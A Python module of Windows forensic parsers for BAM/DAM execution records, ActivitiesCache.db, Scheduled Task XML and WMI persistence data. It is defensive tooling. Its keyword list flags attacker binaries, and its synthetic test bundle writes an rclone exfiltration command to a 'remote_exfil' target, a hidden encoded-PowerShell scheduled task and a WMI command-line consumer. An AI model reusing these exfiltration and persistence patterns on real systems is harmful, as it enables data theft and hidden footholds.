"""Extended Windows Forensic Artifact Parsers:
- BAM / DAM (Background/Desktop Activity Moderator) via offline Hive or live winreg
- Windows 10/11 ActivitiesCache.db (SQLite Timeline ?mode=ro + WAL copy)
- Scheduled Tasks XML / Job parser
- WMI Persistence (OBJECTS.DATA) CommandLineEventConsumer / EventFilter scanner
"""

from datetime import datetime, timedelta, timezone
import json
import os
import re
import shutil
import sqlite3
import struct
import tempfile
import xml.etree.ElementTree as ET
from typing import Any, Dict, List, Optional


def _filetime_to_iso(ft: int) -> Optional[str]:
    if not ft or ft < 116444736000000000:
        return None
    try:
        dt = datetime(1601, 1, 1, tzinfo=timezone.utc) + timedelta(microseconds=ft // 10)
        return dt.strftime("%Y-%m-%d %H:%M:%S UTC")
    except OverflowError:
        return None


def _unix_to_iso(ts: Optional[int]) -> Optional[str]:
    if not ts or ts <= 0:
        return None
    try:
        return datetime.fromtimestamp(ts, tz=timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
    except (OSError, OverflowError, ValueError):
        return None


class ExtendedWindowsArtifacts:
    """Parsers for BAM/DAM, ActivitiesCache.db, Scheduled Tasks XML, and WMI OBJECTS.DATA."""

    @staticmethod
    def parse_bam_dam_from_live_winreg() -> List[Dict[str, Any]]:
        """Read live Windows BAM/DAM UserSettings execution entries safely (read-only)."""
        if os.name != "nt":
            return []
        import winreg
        rows: List[Dict[str, Any]] = []
        for svc in ("bam", "dam"):
            for sub in (rf"SYSTEM\CurrentControlSet\Services\{svc}\State\UserSettings",
                        rf"SYSTEM\CurrentControlSet\Services\{svc}\UserSettings"):
                try:
                    with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, sub) as root_k:
                        i = 0
                        while True:
                            try:
                                sid = winreg.EnumKey(root_k, i)
                                i += 1
                            except OSError:
                                break
                            try:
                                with winreg.OpenKey(root_k, sid) as sk:
                                    j = 0
                                    while True:
                                        try:
                                            vname, vdata, vtype = winreg.EnumValue(sk, j)
                                            j += 1
                                        except OSError:
                                            break
                                        if isinstance(vdata, (bytes, bytearray)) and len(vdata) >= 8 and vname not in ("Version", "SequenceNumber"):
                                            ft = struct.unpack("<Q", vdata[:8])[0]
                                            rows.append({
                                                "artifact_type": f"{svc.upper()} Execution",
                                                "sid": sid,
                                                "executable": vname,
                                                "executed_utc": _filetime_to_iso(ft),
                                                "source": f"HKLM\\{sub}\\{sid}",
                                            })
                            except OSError:
                                continue
                except OSError:
                    continue
        return rows

    @staticmethod
    def parse_bam_dam_from_hive(parsed_hive: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Extract BAM/DAM entries from a parsed offline SYSTEM hive tree."""
        rows: List[Dict[str, Any]] = []

        def walk(node: Dict[str, Any]):
            path = node.get("path", "")
            low = path.lower()
            if ("\\bam\\state\\usersettings\\" in low or "\\bam\\usersettings\\" in low
                    or "\\dam\\state\\usersettings\\" in low):
                sid = node.get("name", "-")
                svc = "DAM" if "\\dam\\" in low else "BAM"
                for val in node.get("values", []):
                    vname = val.get("name", "")
                    raw = val.get("raw_bytes")
                    if isinstance(raw, (bytes, bytearray)) and len(raw) >= 8 and vname not in ("Version", "SequenceNumber"):
                        ft = struct.unpack("<Q", raw[:8])[0]
                        rows.append({
                            "artifact_type": f"{svc} Execution (Offline)",
                            "sid": sid,
                            "executable": vname,
                            "executed_utc": _filetime_to_iso(ft),
                            "source": path,
                        })
            for ch in node.get("children", []):
                walk(ch)

        if parsed_hive.get("root"):
            walk(parsed_hive["root"])
        return rows

    @staticmethod
    def parse_activities_cache(db_path: str, limit: int = 1000) -> List[Dict[str, Any]]:
        """Parse Windows 10/11 Timeline ActivitiesCache.db via read-only working copy (?mode=ro + WAL)."""
        if not os.path.isfile(db_path):
            raise FileNotFoundError(db_path)

        with tempfile.TemporaryDirectory() as td:
            dst = os.path.join(td, os.path.basename(db_path))
            shutil.copy2(db_path, dst)
            for ext in ("-wal", "-shm"):
                if os.path.isfile(db_path + ext):
                    shutil.copy2(db_path + ext, dst + ext)
            con = sqlite3.connect(f"file:{dst}?mode=ro", uri=True)
            try:
                rows: List[Dict[str, Any]] = []
                tables = {r[0] for r in con.execute("SELECT name FROM sqlite_master WHERE type='table'").fetchall()}
                if "Activity" in tables:
                    q = (
                        "SELECT AppId, ActivityType, StartTime, EndTime, LastModifiedTime, Payload, AppActivityId "
                        "FROM Activity ORDER BY StartTime DESC LIMIT ?"
                    )
                    for app_id_raw, act_type, st, et, lmt, payload_raw, app_act_id in con.execute(q, (limit,)).fetchall():
                        app_name = str(app_id_raw or "-")
                        try:
                            parsed_app = json.loads(app_id_raw)
                            if isinstance(parsed_app, list) and parsed_app:
                                app_name = parsed_app[0].get("application", app_name)
                        except Exception:
                            pass
                        payload_preview = ""
                        if isinstance(payload_raw, (bytes, bytearray)):
                            payload_preview = payload_raw.decode("utf-8", "replace")[:200]
                        elif payload_raw:
                            payload_preview = str(payload_raw)[:200]
                        rows.append({
                            "artifact_type": "Windows Timeline (ActivitiesCache)",
                            "application": app_name,
                            "activity_type": act_type,
                            "start_utc": _unix_to_iso(st),
                            "end_utc": _unix_to_iso(et),
                            "modified_utc": _unix_to_iso(lmt),
                            "app_activity_id": str(app_act_id or "-"),
                            "payload": payload_preview,
                        })
                return rows
            finally:
                con.close()

    @staticmethod
    def parse_scheduled_task_xml(xml_path: str) -> Dict[str, Any]:
        """Parse a Windows Scheduled Task XML file (Author, Triggers, Exec Command/Arguments)."""
        if not os.path.isfile(xml_path):
            raise FileNotFoundError(xml_path)
        tree = ET.parse(xml_path)
        root = tree.getroot()
        ns = ""
        if root.tag.startswith("{"):
            ns = root.tag.split("}", 1)[0] + "}"

        def find_txt(tag: str) -> str:
            el = root.find(f".//{ns}{tag}")
            return (el.text or "").strip() if el is not None and el.text else "-"

        commands: List[str] = []
        for ex in root.findall(f".//{ns}Exec"):
            cmd = ex.find(f"{ns}Command")
            args = ex.find(f"{ns}Arguments")
            c_txt = (cmd.text or "").strip() if cmd is not None and cmd.text else ""
            a_txt = (args.text or "").strip() if args is not None and args.text else ""
            if c_txt:
                commands.append(f"{c_txt} {a_txt}".strip())

        return {
            "artifact_type": "Scheduled Task XML",
            "task_name": os.path.basename(xml_path),
            "author": find_txt("Author"),
            "date": find_txt("Date"),
            "user_id": find_txt("UserId"),
            "run_level": find_txt("RunLevel"),
            "commands": commands,
            "suspicious": any(k in " ".join(commands).lower() for k in ("powershell", "cmd.exe", "mshta", "rundll32", "-enc", "temp\\")),
        }

    @staticmethod
    def scan_wmi_objects_data(objects_path: str, max_mb: int = 32) -> List[Dict[str, Any]]:
        """Scan WMI repository OBJECTS.DATA for EventFilter / CommandLineEventConsumer persistence."""
        if not os.path.isfile(objects_path):
            raise FileNotFoundError(objects_path)
        with open(objects_path, "rb") as f:
            raw = f.read(min(os.path.getsize(objects_path), max_mb * 1024 * 1024))

        findings: List[Dict[str, Any]] = []
        markers = [
            (b"CommandLineEventConsumer", "WMI CommandLineEventConsumer"),
            (b"ActiveScriptEventConsumer", "WMI ActiveScriptEventConsumer"),
            (b"__EventFilter", "WMI __EventFilter"),
            (b"__FilterToConsumerBinding", "WMI __FilterToConsumerBinding"),
        ]
        for sig, label in markers:
            pos = 0
            while True:
                idx = raw.find(sig, pos)
                if idx < 0:
                    break
                pos = idx + len(sig)
                window = raw[max(0, idx - 64):min(len(raw), idx + 320)]
                ascii_runs = re.findall(rb"[ -~]{6,140}", window)
                preview = " | ".join(r.decode("ascii", "replace") for r in ascii_runs[:4])
                findings.append({
                    "artifact_type": label,
                    "offset": f"0x{idx:08X}",
                    "preview": preview[:240],
                    "suspicious": "Consumer" in label,
                })
                if len(findings) >= 500:
                    return findings
        return findings


def create_synthetic_extended_windows_bundle(output_dir: str) -> Dict[str, str]:
    """Generate synthetic ActivitiesCache.db, Scheduled Task XML, and WMI OBJECTS.DATA for tests/demos."""
    os.makedirs(output_dir, exist_ok=True)

    # 1. ActivitiesCache.db
    act_db = os.path.join(output_dir, "ActivitiesCache.db")
    if os.path.exists(act_db):
        os.remove(act_db)
    con = sqlite3.connect(act_db)
    con.execute(
        "CREATE TABLE Activity (Id BLOB, AppId TEXT, ActivityType INTEGER, StartTime INTEGER, "
        "EndTime INTEGER, LastModifiedTime INTEGER, Payload BLOB, AppActivityId TEXT)"
    )
    con.execute(
        "INSERT INTO Activity VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
        (
            b"\x01" * 16,
            json.dumps([{"application": r"C:\Tools\rclone.exe", "platform": "windows_win32"}]),
            6,
            1773570120,
            1773570420,
            1773570420,
            json.dumps({"displayText": "rclone copy C:\\GizliProjeler remote_exfil:drop"}).encode("utf-8"),
            "rclone-session-01",
        ),
    )
    con.commit()
    con.close()

    # 2. Scheduled Task XML
    task_xml = os.path.join(output_dir, "UpdaterTask.xml")
    with open(task_xml, "w", encoding="utf-8") as f:
        f.write(
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">'
            "<RegistrationInfo><Date>2026-03-15T09:30:00</Date><Author>AhmetK</Author></RegistrationInfo>"
            "<Principals><Principal><UserId>S-1-5-21-1001</UserId><RunLevel>HighestAvailable</RunLevel></Principal></Principals>"
            "<Actions><Exec><Command>powershell.exe</Command><Arguments>-WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUA</Arguments></Exec></Actions>"
            "</Task>"
        )

    # 3. WMI OBJECTS.DATA
    wmi_path = os.path.join(output_dir, "OBJECTS.DATA")
    wmi_blob = (
        b"\x00" * 512
        + b"__EventFilter\x00SELECT * FROM __InstanceModificationEvent WITHIN 60\x00"
        + b"\x00" * 128
        + b"CommandLineEventConsumer\x00powershell.exe -enc SQBuAHYAbwBrAGUA\x00"
        + b"\x00" * 128
        + b"__FilterToConsumerBinding\x00UpdaterFilter\x00"
    )
    with open(wmi_path, "wb") as f:
        f.write(wmi_blob)

    return {"activities_db": act_db, "task_xml": task_xml, "wmi_objects": wmi_path}
